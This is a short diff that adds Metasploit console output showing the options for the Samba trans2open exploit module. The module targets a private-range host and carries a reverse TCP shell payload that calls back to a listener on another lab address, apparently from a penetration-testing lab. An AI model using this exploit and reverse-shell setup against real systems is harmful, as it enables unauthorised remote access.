@@ -1,0 +1,28 @@
+msf5 exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.221.130  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.221.134  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+msf5 exploit(linux/samba/trans2open) > 
+
